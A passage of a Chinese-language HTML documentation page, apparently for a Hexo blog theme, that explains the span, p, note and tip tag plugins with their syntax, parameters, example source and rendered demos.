id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用-note">2.4 引用 note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带 icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部 icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021 年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021 年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021 年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021 年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021 年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div> 2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021 年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021 年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021 年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021 年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021 年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持 fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% 